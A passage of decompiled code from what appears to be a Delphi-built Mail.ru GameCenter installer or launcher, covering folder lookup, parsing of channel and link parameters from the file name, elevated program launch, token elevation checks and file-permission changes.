      sub_425250(*a5, (volatile __int32 *)&v9);
      sub_407968(a5, v9, a4);
    }
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_44D154;
  return sub_406C44(&v9);
}
// 44D160: using guessed type int __fastcall sub_44D160(_DWORD, _DWORD);

//----- (0044D160) --------------------------------------------------------
int __fastcall sub_44D160(char a1, int a2)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v4; // [esp-4h] [ebp-18h]
  int v5; // [esp+0h] [ebp-14h] BYREF
  int v6; // [esp+4h] [ebp-10h] BYREF
  int v7; // [esp+8h] [ebp-Ch] BYREF
  int v8; // [esp+Ch] [ebp-8h]
  char v9; // [esp+13h] [ebp-1h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v7 = 0;
  v6 = 0;
  v5 = 0;
  v8 = a2;
  v9 = a1;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_44D3C9;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  switch ( a1 )
  {
    case 0:
      if ( !dword_467CD4 )
      {
        sub_4273A0((int)L"SystemDrive", &v7);
        sub_406FE8(&dword_467CD4, v7);
        if ( !dword_467CD4 )
        {
          sub_406FE8(&dword_467CD4, (int)dword_44D404);
          sub_407910(&dword_467CD4, dword_44D414);
        }
        sub_425250(dword_467CD4, &v6);
        sub_406FE8(&dword_467CD4, v6);
      }
      sub_406FE8((volatile __int32 *)v8, dword_467CD4);
      break;
    case 1:
      sub_441BC0(40, off_4681A0, (volatile __int32 *)v8);
      break;
    case 2:
      sub_44D0D0(-1, off_467F00, 1, L"Downloads", (volatile __int32 *)v8);
      break;
    case 3:
      sub_44D0D0(39, off_467F24, 1, L"Pictures", (volatile __int32 *)v8);
      break;
    case 4:
      sub_441BC0(5, off_467FF0, (volatile __int32 *)v8);
      break;
    case 5:
      sub_441BC0(16, off_467F14, (volatile __int32 *)v8);
      break;
    case 6:
      sub_441BC0(26, off_468084, (volatile __int32 *)v8);
      break;
    case 7:
      sub_441BC0(28, off_467F40, (volatile __int32 *)v8);
      break;
    case 8:
      sub_441BC0(14, off_4680A4, (volatile __int32 *)v8);
      break;
    case 9:
      sub_441BC0(2, off_4680EC, (volatile __int32 *)v8);
      break;
    case 10:
      sub_441BC0(7, off_467F88, (volatile __int32 *)v8);
      break;
    case 11:
      sub_4273D0(&v5);
      sub_4252A0(v5, (volatile __int32 *)v8);
      break;
    case 12:
      sub_441BC0(7, off_468098, (volatile __int32 *)v8);
      break;
    case 13:
      sub_44D0D0(-1, off_4681BC, 1, L"Saved Games", (volatile __int32 *)v8);
      break;
    case 14:
      sub_44D0D0(-1, off_468054, 6, L"Microsoft\\Internet Explorer\\Quick Launch", (volatile __int32 *)v8);
      break;
    default:
      sub_406C44((_DWORD *)v8);
      break;
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_44D3D0;
  sub_406C44(&v5);
  return sub_406CA4((int)&v6, 2);
}
// 44D3E0: using guessed type wchar_t aSystemdrive[12];
// 44D404: using guessed type int dword_44D404[4];
// 44D414: using guessed type int dword_44D414[4];
// 44D424: using guessed type wchar_t aDownloads[10];
// 44D444: using guessed type wchar_t aPictures[9];
// 44D464: using guessed type wchar_t aSavedGames[12];
// 44D488: using guessed type wchar_t aMicrosoftInter[41];
// 467F00: using guessed type void *off_467F00;
// 467F14: using guessed type void *off_467F14;
// 467F24: using guessed type void *off_467F24;
// 467F40: using guessed type void *off_467F40;
// 467F88: using guessed type void *off_467F88;
// 467FF0: using guessed type void *off_467FF0;
// 468054: using guessed type void *off_468054;
// 468084: using guessed type void *off_468084;
// 468098: using guessed type void *off_468098;
// 4680A4: using guessed type void *off_4680A4;
// 4680EC: using guessed type void *off_4680EC;
// 4681A0: using guessed type void *off_4681A0;
// 4681BC: using guessed type void *off_4681BC;

//----- (0044D8D0) --------------------------------------------------------
unsigned __int8 __fastcall sub_44D8D0(volatile __int32 *a1)
{
  return sub_425250((int)L"GameCenter", a1);
}
// 44D8F4: using guessed type wchar_t aGamecenter[11];

//----- (0044D910) --------------------------------------------------------
_DWORD *__fastcall sub_44D910(int a1, int a2)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  void *v5; // [esp+0h] [ebp-Ch] BYREF
  int v6; // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = 0;
  v6 = a2;
  v7 = a1;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_44D960;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_425250(a1, (volatile __int32 *)&v5);
  sub_407968((volatile __int32 *)v6, v5, L"GameCenter.exe");
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_44D967;
  return sub_406C44(&v5);
}
// 44D978: using guessed type wchar_t aGamecenterExe[15];

//----- (0044D9A0) --------------------------------------------------------
_DWORD *__fastcall sub_44D9A0(int a1, int a2)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  void *v5; // [esp+0h] [ebp-Ch] BYREF
  int v6; // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = 0;
  v6 = a2;
  v7 = a1;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_44D9F0;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_425250(a1, (volatile __int32 *)&v5);
  sub_407968((volatile __int32 *)v6, v5, L"GameCenter.ini");
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_44D9F7;
  return sub_406C44(&v5);
}
// 44DA08: using guessed type wchar_t aGamecenterIni[15];

//----- (0044DA30) --------------------------------------------------------
_DWORD *__fastcall sub_44DA30(int a1, int a2, volatile __int32 *a3)
{
  int v3; // eax
  char v4; // zf
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // edx
  int v9; // eax
  int v10; // eax
  unsigned int v12[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v13; // [esp-4h] [ebp-28h]
  int v14; // [esp+4h] [ebp-20h] BYREF
  void *v15; // [esp+8h] [ebp-1Ch] BYREF
  int v16; // [esp+Ch] [ebp-18h] BYREF
  int v17; // [esp+10h] [ebp-14h]
  int v18; // [esp+14h] [ebp-10h] BYREF
  volatile __int32 *v19; // [esp+18h] [ebp-Ch]
  int v20; // [esp+1Ch] [ebp-8h]
  int v21; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v14 = 0;
  v15 = 0;
  v16 = 0;
  v18 = 0;
  v19 = a3;
  v20 = a2;
  v21 = a1;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_44DB72;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  sub_406C44(a3);
  v17 = 1;
  while ( 1 )
  {
    while ( 1 )
    {
      v5 = System::__linkproc__ LStrLen(v21);
      if ( v5 < v17 )
        break;
      v3 = System::__linkproc__ LStrLen(v20);
      sub_407AD8(v21, v17, v3, &v16);
      sub_407AA0(v16, v20);
      if ( v4 )
        break;
      ++v17;
    }
    v6 = System::__linkproc__ LStrLen(v21);
    if ( v6 < v17 )
      break;
    v7 = System::__linkproc__ LStrLen(v20);
    v17 += v7;
    sub_406C44(&v18);
    while ( 1 )
    {
      v9 = System::__linkproc__ LStrLen(v21);
      if ( v9 <= v17 || !sub_414B2C(*(_WORD *)(v21 + 2 * v17 - 2), &dword_44DB80) )
        break;
      HIWORD(v8) = HIWORD(v21);
      LOWORD(v8) = *(_WORD *)(v21 + 2 * v17 - 2);
      unknown_libname_48(&v15, v8);
      sub_407910(&v18, v15);
      ++v17;
    }
    v10 = System::__linkproc__ LStrLen(v21);
    if ( v10 < v17 )
      break;
    sub_407AD8(v21, v17, 1, &v14);
    sub_407AA0(v14, (int)&dword_44DBAC);
    if ( v4 )
    {
      sub_406FE8(v19, v18);
      break;
    }
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_44DB79;
  sub_406CA4((int)&v14, 3);
  return sub_406C44(&v18);
}
// 44DA91: variable 'v4' is possibly undefined
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4077A8: using guessed type int __fastcall unknown_libname_48(_DWORD, _DWORD);
// 44DB80: using guessed type int dword_44DB80;
// 44DBAC: using guessed type int dword_44DBAC;

//----- (0044DBB0) --------------------------------------------------------
int __fastcall sub_44DBB0(__int32 a1, char a2, char a3, volatile __int32 *a4, volatile __int32 *a5, int *a6)
{
  int v6; // eax
  int v7; // eax
  unsigned int v9; // [esp-18h] [ebp-44h]
  _DWORD v10[4]; // [esp-Ch] [ebp-38h] BYREF
  unsigned int v11; // [esp+4h] [ebp-28h] BYREF
  __int32 v12; // [esp+8h] [ebp-24h] BYREF
  __int32 v13; // [esp+Ch] [ebp-20h] BYREF
  char v14; // [esp+13h] [ebp-19h]
  int v15; // [esp+14h] [ebp-18h] BYREF
  int i; // [esp+18h] [ebp-14h]
  int v17; // [esp+1Ch] [ebp-10h] BYREF
  DWORD cchLength; // [esp+20h] [ebp-Ch] BYREF
  char v19; // [esp+27h] [ebp-5h]
  __int32 v20; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v11 = 0;
  v12 = 0;
  v13 = 0;
  cchLength = 0;
  v17 = 0;
  v14 = a3;
  v19 = a2;
  v20 = a1;
  if ( a4 )
    *a4 = 0;
  if ( a5 )
    *a5 = 0;
  if ( a6 )
    *a6 = 0;
  v10[2] = &savedregs;
  v10[1] = &loc_44DDC3;
  v10[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_407030((volatile __int32 *)&cchLength, v20);
  sub_406C44(a6);
  if ( v19 )
  {
    v6 = System::__linkproc__ LStrLen(cchLength);
    if ( v6 >= 1 )
    {
      i = v6;
      while ( *(_WORD *)(cchLength + 2 * i - 2) != 92 && *(_WORD *)(cchLength + 2 * i - 2) != 47 )
      {
        if ( !--i )
          goto LABEL_14;
      }
      sub_407AD8(cchLength, i + 1, 0x7FFFFFFF, &cchLength);
    }
  }
LABEL_14:
  sub_426A60(cchLength, &v17);
  sub_44DA30(v17, (int)L"chnl", &v13);
  sub_406FE8(a4, v13);
  sub_44DA30(v17, (int)L"p1link", &v12);
  sub_406FE8(a5, v12);
  i = sub_407B7C((int)&dword_44DE14, cchLength, 1);
  if ( i >= 1 )
  {
    sub_407AD8(cchLength, i + 1, 0x7FFFFFFF, &cchLength);
    i = sub_407B7C((int)&dword_44DE14, cchLength, 1);
    if ( i >= 1 )
    {
      sub_407AD8(cchLength, 1, i - 1, a6);
      if ( (unsigned __int8)Sysutils::TryStrToInt(*a6, &v15) )
      {
        sub_407AD8(cchLength, i + 1, 0x7FFFFFFF, &cchLength);
        for ( i = 0; ; ++i )
        {
          v7 = System::__linkproc__ LStrLen(cchLength);
          if ( v7 <= i || !sub_414B2C(*(_WORD *)(cchLength + 2 * i), &dword_44DE18) )
            break;
        }
        sub_407AD8(cchLength, 1, i, &v11);
        v9 = v11;
        sub_4079F0(a6, 3);
      }
      else
      {
        sub_406C44(a6);
      }
    }
  }
  __writefsdword(0, v9);
  sub_406CA4((int)&v11, 3);
  return sub_406CA4((int)&v17, 2);
}
// 44DDA0: variable 'v9' is possibly undefined
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 44DDE0: using guessed type wchar_t aChnl[5];
// 44DDF8: using guessed type wchar_t aP1link[7];
// 44DE14: using guessed type int dword_44DE14;
// 44DE18: using guessed type int dword_44DE18;
// 44DE3C: using guessed type _strings str___5[1];
// 44DBB0: using guessed type __int32 var_20;

//----- (0044DE50) --------------------------------------------------------
volatile __int32 *__usercall sub_44DE50@<eax>(int a1@<eax>, int a2)
{
  int v3; // [esp+0h] [ebp-8h]

  v3 = System::__linkproc__ LStrLen(*(_DWORD *)(a2 - 4));
  System::__linkproc__ DynArraySetLength(v3 + 1);
  return sub_406FE8((volatile __int32 *)(*(_DWORD *)(a2 - 4) + 4 * v3), a1);
}
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (0044DEA0) --------------------------------------------------------
char __usercall sub_44DEA0@<al>(char a1@<al>, volatile __int32 *a2@<edx>, _DWORD **a3@<edi>)
{
  int v3; // eax
  bool v4; // al
  int v5; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-78h] BYREF
  int *v8; // [esp-14h] [ebp-74h]
  int *v9; // [esp-10h] [ebp-70h]
  unsigned int v10[2]; // [esp-Ch] [ebp-6Ch] BYREF
  int *v11; // [esp-4h] [ebp-64h]
  int v12; // [esp+0h] [ebp-60h] BYREF
  int v13; // [esp+4h] [ebp-5Ch] BYREF
  int v14; // [esp+8h] [ebp-58h] BYREF
  int v15; // [esp+Ch] [ebp-54h] BYREF
  int v16; // [esp+10h] [ebp-50h] BYREF
  int v17; // [esp+14h] [ebp-4Ch] BYREF
  int v18; // [esp+18h] [ebp-48h] BYREF
  int v19; // [esp+1Ch] [ebp-44h] BYREF
  void *v20; // [esp+20h] [ebp-40h] BYREF
  int v21; // [esp+24h] [ebp-3Ch] BYREF
  int v22; // [esp+28h] [ebp-38h] BYREF
  void *v23; // [esp+2Ch] [ebp-34h] BYREF
  __int32 v24; // [esp+30h] [ebp-30h] BYREF
  int v25; // [esp+34h] [ebp-2Ch]
  __int64 v26; // [esp+38h] [ebp-28h]
  _DWORD *v27; // [esp+44h] [ebp-1Ch]
  int v28; // [esp+48h] [ebp-18h]
  __int32 v29; // [esp+4Ch] [ebp-14h] BYREF
  char v30; // [esp+53h] [ebp-Dh]
  volatile __int32 *v31; // [esp+54h] [ebp-Ch]
  char v32; // [esp+5Bh] [ebp-5h]
  __int32 *v33; // [esp+5Ch] [ebp-4h] BYREF
  int savedregs; // [esp+60h] [ebp+0h] BYREF

  v31 = a2;
  v32 = a1;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_44E14A;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_408B34(&v33, (int)&byte_4224D0);
  if ( v32 )
  {
    sub_4238F0(&v24);
    v8 = &v24;
    sub_44D8D0((volatile __int32 *)&v23);
    sub_407910(&v24, v23);
    sub_44DE50(v24, (int)&savedregs);
  }
  else
  {
    sub_44D160(7, (int)&v21);
    sub_425250(v21, &v22);
    v8 = &v22;
    sub_44D8D0((volatile __int32 *)&v20);
    sub_407910(&v22, v20);
    sub_44DE50(v22, (int)&savedregs);
    sub_44D160(7, (int)&v19);
    sub_407910(&v19, L"\\Mail.ru\\GameCenter\\");
    sub_44DE50(v19, (int)&savedregs);
    sub_44D160(7, (int)&v18);
    sub_407910(&v18, L"\\MyComGames\\");
    sub_44DE50(v18, (int)&savedregs);
  }
  sub_407030(&v29, *v33);
  v3 = sub_40867C((int)v33);
  if ( v3 >= 0 )
  {
    v25 = v3 + 1;
    v28 = 0;
    while ( 1 )
    {
      if ( (unsigned __int8)sub_426C90(v33[v28]) )
      {
        sub_44D910(v33[v28], (int)&v17);
        if ( (unsigned __int8)sub_426B00(v17) )
        {
          sub_44D9A0(v33[v28], (int)&v16);
          if ( (unsigned __int8)sub_426B00(v16) )
            break;
        }
      }
      ++v28;
      if ( !--v25 )
        goto LABEL_11;
    }
    sub_407030(&v29, v33[v28]);
  }
LABEL_11:
  if ( v31 )
    sub_406FE8(v31, v29);
  sub_44D910(v29, (int)&v15);
  v4 = 0;
  if ( (unsigned __int8)sub_426B00(v15) )
  {
    sub_44D9A0(v29, (int)&v14);
    if ( (unsigned __int8)sub_426B00(v14) )
      v4 = 1;
  }
  v30 = v4;
  if ( v4 )
  {
    sub_44D9A0(v29, (int)&v13);
    v27 = (_DWORD *)sub_43EF70((int)&cls_IniUtil_TUnicodeIniFile, 1, v13, a3, 0, 0, 0, 1);
    v9 = &savedregs;
    v8 = (int *)&loc_44E0A8;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    v30 = sub_440D40((int)v27, (int)L"UMS", v5);
    __writefsdword(0, (unsigned int)ExceptionList);
    v9 = (int *)&loc_44E0AF;
    sub_405598(v27);
  }
  if ( v30 )
  {
    sub_44D910(v29, (int)&v12);
    v26 = sub_4255C0(v12, 0);
    if ( v26 <= 256000 )
      v30 = 0;
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_44E151;
  sub_406CA4((int)&v12, 6);
  sub_406CA4((int)&v18, 2);
  sub_406C44(&v20);
  sub_406C44(&v21);
  sub_406CA4((int)&v22, 2);
  sub_406C44(&v24);
  sub_406C44(&v29);
  sub_408B34(&v33, (int)&byte_4224D0);
  return v30;
}
// 44E08A: variable 'v5' is possibly undefined
// 4224D0: using guessed type char byte_4224D0;
// 43E520: using guessed type int (__stdcall *cls_IniUtil_TUnicodeIniFile)(int);
// 44E164: using guessed type wchar_t aMailRuGamecent[21];
// 44E19C: using guessed type wchar_t aMycomgames[13];
// 44E1C4: using guessed type wchar_t aUms[4];
// 44DEA0: using guessed type __int32 var_14;

//----- (0044E1D0) --------------------------------------------------------
bool __fastcall sub_44E1D0(int a1, HWND a2, int a3, int a4, int a5)
{
  unsigned int v6[3]; // [esp-Ch] [ebp-58h] BYREF
  struct _SHELLEXECUTEINFOW ExecInfo; // [esp+0h] [ebp-4Ch] BYREF
  bool v8; // [esp+3Fh] [ebp-Dh]
  int v9; // [esp+40h] [ebp-Ch]
  HWND v10; // [esp+44h] [ebp-8h]
  int v11; // [esp+48h] [ebp-4h]
  int savedregs; // [esp+4Ch] [ebp+0h] BYREF

  v9 = a3;
  v10 = a2;
  v11 = a1;
  Guitesting::TGUITestCase::Hide(&ExecInfo, 60);
  ExecInfo.cbSize = 60;
  ExecInfo.fMask = 256;
  ExecInfo.hwnd = v10;
  ExecInfo.lpFile = (LPCWSTR)sub_407790(v9);
  ExecInfo.lpParameters = (LPCWSTR)sub_407790(a4);
  ExecInfo.lpDirectory = (LPCWSTR)sub_407790(a5);
  ExecInfo.nShow = 1;
  ExecInfo.lpVerb = (LPCWSTR)sub_407790(v11);
  ++dword_467D34;
  v6[2] = (unsigned int)&savedregs;
  v6[1] = (unsigned int)&loc_44E26D;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v8 = ShellExecuteExW(&ExecInfo);
  __writefsdword(0, v6[0]);
  --dword_467D34;
  return v8;
}
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 467D34: using guessed type int dword_467D34;

//----- (0044E280) --------------------------------------------------------
bool __fastcall sub_44E280(HWND a1, int a2, int a3, int a4)
{
  if ( sub_425ED0(3u, 0) )
    return sub_44E1D0((int)L"runas", a1, a2, a3, a4);
  else
    return sub_44E1D0((int)L"open", a1, a2, a3, a4);
}
// 44E2EC: using guessed type wchar_t aRunas[6];
// 44E304: using guessed type wchar_t aOpen[5];

//----- (0044E310) --------------------------------------------------------
bool sub_44E310()
{
  HANDLE CurrentProcess; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v3; // [esp-8h] [ebp-18h]
  int *v4; // [esp-4h] [ebp-14h]
  DWORD ReturnLength; // [esp+0h] [ebp-10h] BYREF
  int TokenInformation; // [esp+4h] [ebp-Ch] BYREF
  HANDLE TokenHandle; // [esp+8h] [ebp-8h] BYREF
  bool v8; // [esp+Fh] [ebp-1h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v8 = 0;
  TokenHandle = 0;
  CurrentProcess = GetCurrentProcess();
  if ( OpenProcessToken(CurrentProcess, 8u, &TokenHandle) )
  {
    v4 = &savedregs;
    v3 = &loc_44E393;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    ReturnLength = 0;
    if ( GetTokenInformation(TokenHandle, TokenElevation, &TokenInformation, 4u, &ReturnLength) && ReturnLength == 4 )
    {
      v8 = TokenInformation != 0;
      __writefsdword(0, (unsigned int)ExceptionList);
      v4 = (int *)&loc_44E39A;
      CloseHandle_0(TokenHandle);
    }
    else
    {
      System::__linkproc__ TryFinallyExit(ExceptionList, v3, v4);
    }
  }
  return v8;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (0044E3B0) --------------------------------------------------------
char sub_44E3B0()
{
  HANDLE CurrentProcess; // eax
  bool v1; // al
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v4; // [esp-8h] [ebp-18h]
  int *v5; // [esp-4h] [ebp-14h]
  DWORD ReturnLength; // [esp+0h] [ebp-10h] BYREF
  int TokenInformation; // [esp+4h] [ebp-Ch] BYREF
  HANDLE TokenHandle; // [esp+8h] [ebp-8h] BYREF
  bool v9; // [esp+Fh] [ebp-1h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v9 = 0;
  TokenHandle = 0;
  CurrentProcess = GetCurrentProcess();
  if ( OpenProcessToken(CurrentProcess, 8u, &TokenHandle) )
  {
    v5 = &savedregs;
    v4 = &loc_44E440;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    ReturnLength = 0;
    if ( GetTokenInformation(TokenHandle, TokenElevationType, &TokenInformation, 4u, &ReturnLength) && ReturnLength == 4 )
    {
      v1 = TokenInformation == 2 || TokenInformation == 3;
      v9 = v1;
      __writefsdword(0, (unsigned int)ExceptionList);
      v5 = (int *)&loc_44E447;
      CloseHandle_0(TokenHandle);
    }
    else
    {
      System::__linkproc__ TryFinallyExit(ExceptionList, v4, v5);
    }
  }
  return v9;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (0044E450) --------------------------------------------------------
void sub_44E450()
{
  if ( !++dword_46EEA4 )
    CoUninitialize();
}
// 46EEA4: using guessed type int dword_46EEA4;

//----- (0044E9F0) --------------------------------------------------------
int __fastcall sub_44E9F0(volatile __int32 *a1, _DWORD *a2, int a3, _DWORD *a4)
{
  int result; // eax

  result = a3 & *a2;
  if ( result )
  {
    if ( *a1 )
      sub_407910(a1, &dword_44EA4C);
    sub_407910(a1, a4);
    result = ~a3;
    *a2 &= ~a3;
  }
  return result;
}
// 44EA4C: using guessed type int dword_44EA4C;

//----- (0044EA50) --------------------------------------------------------
int __usercall sub_44EA50@<eax>(int a1@<edi>, int a2@<esi>, long double a3@<st0>)
{
  HANDLE CurrentThread; // eax
  HANDLE CurrentProcess; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v7; // [esp-8h] [ebp-10h]
  int *v8; // [esp-4h] [ebp-Ch]
  _DWORD *v9; // [esp+0h] [ebp-8h]
  int v10; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v10 = 0;
  v9 = (_DWORD *)Qcomctrls::TTab::TTab(&cls_WinSecureUtil_TWinSecurityToken, 1);
  v8 = &savedregs;
  v7 = &loc_44EAD8;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  CurrentThread = GetCurrentThread();
  if ( sub_4505D0((int)v9, CurrentThread, 8u, a1, a2, a3, 1, 1)
    || (CurrentProcess = GetCurrentProcess(), sub_450510((int)v9, CurrentProcess, 8u, a1, a2, a3, 0)) )
  {
    v10 = sub_4503E0((int)v9, 0, a1, a2, a3);
    __writefsdword(0, (unsigned int)ExceptionList);
    v8 = (int *)&loc_44EADF;
    sub_405598(v9);
  }
  else
  {
    System::__linkproc__ TryFinallyExit(ExceptionList, v7, v8);
  }
  return v10;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 44E4BC: using guessed type __int16 cls_WinSecureUtil_TWinSecurityToken;
// 450270: using guessed type int __fastcall Qcomctrls::TTab::TTab(_DWORD, _DWORD);

//----- (0044EAF0) --------------------------------------------------------
char __usercall sub_44EAF0@<al>(int a1@<edi>, int a2@<esi>, long double a3@<st0>, int a4)
{
  unsigned int v5[2]; // [esp-18h] [ebp-24h] BYREF
  void **v6; // [esp-10h] [ebp-1Ch]
  _DWORD v7[3]; // [esp-Ch] [ebp-18h] BYREF
  int *v8; // [esp+0h] [ebp-Ch]
  void **v9; // [esp+4h] [ebp-8h]
  char v10; // [esp+Bh] [ebp-1h]
  void *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v10 = 0;
  v9 = (void **)sub_44EA50(a1, a2, a3);
  if ( v9 )
  {
    v7[2] = &savedregs;
    v7[1] = &loc_44EB7C;
    v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    v8 = sub_44EEA0((int)&cls_WinSecureUtil_TWinSecurityId, 1, *v9);
    v6 = &savedregs;
    v5[1] = (unsigned int)&loc_44EB5F;
    v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    v10 = sub_450150(
            *(void (__fastcall ****)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *))(a4 - 4),
            (int)v8,
            a1,
            a2,
            a3);
    __writefsdword(0, v5[0]);
    v6 = (void **)&loc_44EB66;
    sub_405598(v8);
    __writefsdword(0, (unsigned int)v9);
    savedregs = &loc_44EB83;
    System::__linkproc__ FreeMem(v9);
  }
  return v10;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 44E564: using guessed type __int16 cls_WinSecureUtil_TWinSecurityId;

//----- (0044EB90) --------------------------------------------------------
char __usercall sub_44EB90@<al>(unsigned int a1@<eax>, int a2@<edx>, int a3@<edi>, int a4@<esi>, long double a5@<st0>)
{
  unsigned int v6[2]; // [esp-24h] [ebp-3Ch] BYREF
  void **v7; // [esp-1Ch] [ebp-34h]
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-18h] [ebp-30h] BYREF
  void *v9; // [esp-14h] [ebp-2Ch]
  void **v10; // [esp-10h] [ebp-28h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v12; // [esp-8h] [ebp-20h]
  void **v13; // [esp-4h] [ebp-1Ch]
  int *v14; // [esp+0h] [ebp-18h]
  int v15; // [esp+4h] [ebp-14h]
  _DWORD *v16; // [esp+8h] [ebp-10h]
  char v17; // [esp+Eh] [ebp-Ah]
  char v18; // [esp+Fh] [ebp-9h]
  unsigned int v19; // [esp+10h] [ebp-8h]
  _DWORD *v20; // [esp+14h] [ebp-4h]
  void *savedregs; // [esp+18h] [ebp+0h] BYREF

  v18 = a2;
  v19 = a1;
  LOBYTE(a2) = 1;
  v20 = (_DWORD *)Idcustomhttpserver::TIdHTTPResponseInfo::TIdHTTPResponseInfo(
                    &cls_WinSecureUtil_TWinSecureFile,
                    a2,
                    a1);
  v13 = &savedregs;
  v12 = &loc_44ECE6;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v16 = (_DWORD *)sub_44F1F0((int)&cls_WinSecureUtil_TWinSecurityFileACL, 1);
  v10 = &savedregs;
  v9 = &loc_44ECC9;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  if ( v18 )
  {
    v17 = sub_44FED0(
            (void (__fastcall ***)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *))v20,
            (int)v16,
            a3,
            a4,
            a5);
    if ( !v17 && sub_44EAF0(a3, a4, a5, (int)&savedregs) )
      v17 = sub_44FED0(
              (void (__fastcall ***)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *))v20,
              (int)v16,
              a3,
              a4,
              a5);
    System::__linkproc__ TryFinallyExit(v8, v9, v10);
    System::__linkproc__ TryFinallyExit(ExceptionList, v12, v13);
  }
  else
  {
    v14 = sub_44EF60((int)&cls_WinSecureUtil_TWinSecurityId, 1, WinWorldSid, a3, a4, a5, 0);
    v7 = &savedregs;
    v6[1] = (unsigned int)&loc_44EC68;
    v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v6);
    v15 = sub_44F180((int)v16, 0, v14[1]);
    __writefsdword(0, v6[0]);
    v7 = (void **)&loc_44EC6F;
    sub_405598(v14);
    *(_DWORD *)(v15 + 12) = dword_467D90;
    *(_BYTE *)(v15 + 9) = byte_467D8C;
    v17 = sub_44FF50(
            (void (__fastcall ***)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *))v20,
            (int)v16,
            a3,
            a4,
            a5);
    if ( !v17 && sub_44EAF0(a3, a4, a5, (int)&savedregs) )
      v17 = sub_44FF50(
              (void (__fastcall ***)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *))v20,
